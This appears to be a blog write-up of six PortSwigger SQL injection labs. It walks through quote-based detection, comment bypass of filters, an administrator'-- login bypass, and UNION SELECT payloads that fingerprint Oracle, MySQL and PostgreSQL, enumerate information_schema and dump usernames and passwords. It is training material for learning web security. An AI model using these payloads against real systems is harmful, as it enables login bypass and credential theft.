---
title: Portswigger Labs
time: 2025-11-25 12:00:00
categories: [portswigger]
tags: [sqli]
image: 'assets/img/portswigger.png'
---

## SQLi (SQL Injection)

### Lab 01: SQLi in WHERE clause allowing retrieval of hidden data
>  This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
> 
> Goal: Perform a SQL injection attack that causes the application to display one or more unreleased products.

#### Recon

The vulnerable parameter is the **category** value.
A simple test is to insert a **single quote `'`** after the category value and observe the application’s response.

When a quote is added, the application throws an error.
This suggests that the quote breaks the query's string syntax because it introduces an extra unmatched quote.

```sql
category = 'Gifts''
```

<img width="1389" height="493" alt="image" src="https://github.com/user-attachments/assets/177853a0-c050-4091-9a4a-3761c9694a34" />

However, if we add two quotes, the second quote becomes a new empty string, which is valid SQL:

```sql
category = 'Gifts' '' AND released = 1
```

<img width="1386" height="496" alt="image" src="https://github.com/user-attachments/assets/b2f0911e-5d73-4a3a-b57d-f6098a08f789" />

This confirms that the category parameter is vulnerable to SQL injection.

#### Exploitation

The page only displays **released** products because of this condition:

```sql
AND released = 1
```
To view unreleased products, we must remove the `AND released = 1` clause.

##### Comments in SQL

SQL supports inline comments and most SQL engines accept `--` to comment out the rest of the line.

Using this, we can terminate the string and comment out the `released = 1` check:

```sql
category = 'Lifestyle'' --' AND released = 1
```

<img width="1402" height="678" alt="image" src="https://github.com/user-attachments/assets/29e71df7-fd7c-4456-9117-66d0fe776894" />

This reveals **both released and unreleased** products from the *Lifestyle* category.

To retrieve all products from the table, we can use a boolean expression that is always true, such as `1=1`. 

This generates a query similar to:

```sql
SELECT * FROM products WHERE category = 'Lifestyle'' OR 1=1-- ' AND released = 1
```
Eventhough the category is invalid due to extra quote, the payload `OR 1=1` makes the query returns true hence retrieve all data.
<img width="1416" height="738" alt="image" src="https://github.com/user-attachments/assets/3d9658c8-6be1-470a-8ea1-4a0c2291bf68" />

### Lab 02: SQLi allowing login bypass
>  This lab contains a SQL injection vulnerability in the login function.
> 
> Goal: Perform a SQL injection attack that logs in to the application as the administrator user.

#### Recon
Since we didnt have the source code, we can assume that it will be a typical vulnerable login form like this
```sql
SELECT * FROM users 
WHERE username = '<USER_INPUT>' 
  AND password = '<USER_INPUT>';
```
Both the username and password fields are placed directly into the SQL query without proper sanitization. This means we can inject SQL syntax through the username field and bypass the password check entirely.

#### Exploitation
Since we know the username is `administrator`, we want to craft input that comments out the password check. We can use this payload:
```
administrator'-- 
```
SQL query will check only the username and ignore any password that we input.
```sql
SELECT * FROM users 
WHERE username = 'administrator'-- ' 
  AND password = 'test123';
```

### Lab 03: Querying the database type and version on Oracle

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
>
> Goal: Display the database version string. 

#### Recon
We start by testing the category parameter for SQL injection.

- A single quote `'` breaks the query → error.
- Double quotes `''` restore query syntax → confirms injectable field.
- Adding a SQL comment such as `--` makes the backend ignore the rest of the query.

This indicates that we can inject our own SQL in the category parameter.
  
#### Exploitation

To extract data from other tables than the original table in query, we need to use a UNION SELECT injection. But UNION queries must follow strict rules:

- Both SELECT statements must return the same number of columns.
- The data types of corresponding columns must be compatible.

Therefore, we must determine:

- How many columns are returned by the original query.
- Which data types we can inject.

A common way to check column count is:
```sql
' UNION SELECT null--
```
<img width="1396" height="745" alt="image" src="https://github.com/user-attachments/assets/bf687aaa-7611-499e-9656-4d683022914f" />

However, Oracle requires a FROM clause. To resolve this, we query from Oracle’s built-table which is `dual`:
```sql
' UNION SELECT null from dual--
```
<img width="1365" height="622" alt="image" src="https://github.com/user-attachments/assets/bc2794f9-23c2-42eb-8caf-bee8a418ae56" />

Still gives an error? It is likely column count mismatch.

Next, try two columns:
```sql
' UNION SELECT null, null from dual--
```
This time the page loads successfully, meaning the original query returns 2 columns.

<img width="1405" height="538" alt="image" src="https://github.com/user-attachments/assets/74d8cf0e-2f70-45e4-9fee-02a20fdff42f" />

We can query two columns from the table, but we must ensure the data types match the original query’s expected column types. If we try to inject a value with the wrong data type, Oracle will return an error. For example:
```sql
' UNION SELECT 'A', 1 FROM dual--
```
<img width="1347" height="490" alt="image" src="https://github.com/user-attachments/assets/a3971501-20b3-4920-93d4-b05415a4c2be" />

This results in an error because one of the columns expects a string, but we supplied an integer.

To verify the correct data types, we replace the integer with either a string or NULL. Since the following payload works without errors, we can conclude that both columns accept string data:
```sql
' UNION SELECT 'A', NULL FROM dual--
```

<img width="1393" height="543" alt="image" src="https://github.com/user-attachments/assets/8da1e8f9-bb0d-44ab-9be5-a206cbff2587" />


Since the description already states the DB is Oracle, we can use `v$version` table that stores version information.

The column we need is banner.
```sql
' UNION SELECT banner, null FROM v$version--
```

<img width="1401" height="651" alt="image" src="https://github.com/user-attachments/assets/2fc6b5a0-ee4b-47ec-8e43-d19f89367d76" />


### Lab 04: Querying the database type and version on MySQL and Microsoft

> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> 
> Goal: Display the database version string. 

#### Recon
Do the intial testing using quotes and comments. Upon testing, `--` double dash comment didnt work this time. According to <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Portswigger cheatsheat</a>, it is possible that database is MySQL which uses ` --` and `#` as comment.

<img width="1399" height="502" alt="image" src="https://github.com/user-attachments/assets/925fca20-1c46-4b73-ba9e-52370b9e0a6a" />

Do the same enumeration for column numbers and data types. Since this is not Oracle, you dont require to include FROM clause to check the column amounts.
```sql
' UNION SELECT null,null#
```

Same as previous lab, we have 2 columns. Both of columns will return string.
```sql
' UNION SELECT '1','2'#
```
<img width="1386" height="709" alt="image" src="https://github.com/user-attachments/assets/a2b4c0a7-8745-4da3-ba86-853c2a7a51cc" />

##### Exploitation
Now, we have all information that we need to craft the payload. We can use `@@version` to display database version for MySQL.
```sql
' UNION SELECT @@version,'2'#
```
<img width="1405" height="738" alt="image" src="https://github.com/user-attachments/assets/20bdc7c9-bd2a-4a36-83aa-8a5e282f0016" />


### Lab 05: Listing the database contents on non-Oracle databases

> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it
> contains, then retrieve the contents of the table to obtain the username and password of all users.
>
> Goal: Log in as the administrator user.

#### Recon
The setup is similar to previous labs, so we already know the column required and which database that we are using.

#### Exploitation
We can see all contents inside the database using `information_schema`, this include any tables and any columns inside a table. We can refer to <a href="https://www.postgresql.org/docs/current/infoschema-tables.html">PostgreSQL documentation</a> for list of available columns inside `information_schema`. 

We can use `table_name` column to see all tables available.
```sql
' UNION SELECT table_name,null FROM information_schema.tables--
```
<img width="1384" height="583" alt="image" src="https://github.com/user-attachments/assets/239902f7-2115-4509-a31d-61e887af3de4" />


There is a table called `users_nflxix`, most probably contains user information. Now, we can query `information_schema.columns` to list out all columns for `users_nflxix` table.
```sql
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_nflxix'--
```
<img width="1419" height="669" alt="image" src="https://github.com/user-attachments/assets/7dd9e589-6f15-4a25-be54-7ac4c8d2e0f1" />

List out all username and password from `users_nflxix`.
```sql
' UNION SELECT username_deyvdc,password_bebcvo FROM users_nflxix-- 
```
<img width="1384" height="706" alt="image" src="https://github.com/user-attachments/assets/c2ec2185-7a5f-4c1e-b0d9-9747ec86d626" />

### Lab 06: Retrieving multiple values in a single column

> The database contains a different table called users, with columns called username and password.
>
> Goal: Retrieves all usernames and passwords, and use the information to log in as the administrator user. 

#### Recon
I tried to see what DB that we are handling with. Enumerate syntax for all DB and found out that the DB is PostgreSQL. 
```
' UNION SELECT '1',version()--
```
<img width="1407" height="628" alt="image" src="https://github.com/user-attachments/assets/2ecabf37-6449-41e4-8f9d-5bb02395c53e" />

The reason I didnt use the first column to display DB version is because the data type is integer. The input I gave in first column will be included for `productID`.
```
<td>
  <a class="button is-small" href="/product?productId=1">View details</a>
</td>
```

Hence why if I put a string or `version()`, it will return error since there is no product with a string as `productID`.

<img width="1390" height="310" alt="image" src="https://github.com/user-attachments/assets/ae99bfb2-8a24-40fb-bd36-9172dd2e7e2d" />

#### Exploitation
List out all tables and find `users` table.

<img width="1387" height="561" alt="image" src="https://github.com/user-attachments/assets/f1f5a4a8-cb2c-4a4e-adaf-b0ebd42f5832" />

List out all columns inside `users` table.
```
' UNION SELECT 1,column_name from information_schema.columns where table_name='users'--
```
<img width="1372" height="580" alt="image" src="https://github.com/user-attachments/assets/4ed32095-3d7c-44f5-a448-4f35ff4be89c" />

We only have one column that can return string but we need to list out both username and password. It is possible to list those columns seperately but it will be difficult to differentiate which passowrd belongs to which user. So, we can include both columns output into one column only.

Use `||` to concatenate 2 strings, and you can use any delimiter to distinguish username and password.
```
' UNION SELECT 1,username||'~'||password from users--
```
<img width="1387" height="718" alt="image" src="https://github.com/user-attachments/assets/f7222dcd-d1ee-48ee-906b-30a440cd8275" />

